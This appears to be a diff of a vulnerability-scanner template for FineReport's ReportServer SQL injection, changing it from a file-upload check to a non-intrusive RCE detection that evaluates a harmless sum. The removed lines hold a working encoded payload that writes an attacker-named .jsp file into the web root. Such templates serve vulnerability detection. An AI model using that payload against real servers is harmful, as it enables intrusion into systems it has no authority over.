@@ -1,35 +1,36 @@
-id: finereport-sqli-file-upload
+id: finereport-sqli-rce
 
 info:
-  name: FineReport Sqli File Upload
+  name: FineReport SQLi - Remote Code Execution (RCE)
   author: adeljck
   severity: critical
-  description: FineReport ( A business intelligence (BI) and reporting software ) is vulnerable to Arbitrary File Overwrite.
+  description: |
+    Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
   metadata:
-    max-request: 2
+    max-request: 1
     fofa-query: app="帆软-FineReport"
-  tags: finereport,fileupload,intrusive
+    verified: true
+  tags: finereport,rce,sqli
+
 variables:
   string: '{{rand_base(8, "abc")}}'
-  filename: '{{rand_base(8)}}'
+
 http:
   - raw:
       - |
-        GET /webroot/decision/view/ReportServer?test=ssssss&n=${a=sql('FRDemo',DECODE('%ef%bb%bfattach%20database%20%27%2E%2E%2Fwebapps%2Fwebroot%2Fscripts%2Fjs%2F{{filename}}%2Ejsp%27%20as%20%27{{filename}}%27%3B'),1,1)} HTTP/1.1
+        GET /webroot/decision/view/ReportServer?{{string}}=&n=${sum(1024,1)} HTTP/1.1
         Host: {{Hostname}}
-        Connection: close
         Content-Type: application/x-www-form-urlencoded
-        X-Forwarded-For: 127.0.0.1
-        Accept-Encoding: gzip, deflate
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
-        Accept: */*
-      - |
-        GET /webroot/scripts/js/{{filename}}.jsp HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
-    
+
     matchers-condition: and
     matchers:
+      - type: word
+        part: location
+        words:
+          - 'report?{{string}}&n=1025'
+
       - type: status
         status: 
-            - 500
+            - 200
